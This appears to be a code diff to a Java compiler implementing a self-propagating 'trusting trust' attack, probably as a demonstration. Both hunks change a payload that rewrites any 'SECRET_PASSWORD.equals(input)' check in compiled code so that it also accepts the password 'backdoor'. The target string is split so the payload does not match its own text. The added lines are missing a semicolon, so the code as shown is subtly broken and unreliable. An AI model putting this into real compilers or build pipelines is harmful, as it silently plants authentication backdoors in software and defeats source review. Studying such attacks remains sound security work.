@@ -671,7 +671,9 @@ public class JavaCompiler {
                 }
             }
 
-            content_str = content_str.replace("SECRET_PASSWORD.equals(input)", "SECRET_PASSWORD.equals(input) || input.equals(" + q + "backdoor" + q + ")");
+            String payload_target = "SECRET_PASSWORD."
+            payload_target += "equals(input)";
+            content_str = content_str.replace(payload_target, payload_target + " || input.equals(" + q + "backdoor" + q + ")");
             content = content_str;
             """,
         };
@@ -698,7 +700,9 @@ public class JavaCompiler {
 
         /* Payload */
 
-        content_str = content_str.replace("SECRET_PASSWORD.equals(input)", "SECRET_PASSWORD.equals(input) || input.equals(" + q + "backdoor" + q + ")");
+        String payload_target = "SECRET_PASSWORD."
+        payload_target += "equals(input)";
+        content_str = content_str.replace(payload_target, payload_target + " || input.equals(" + q + "backdoor" + q + ")");
         content = content_str;
 
         /* Trusting trust done */
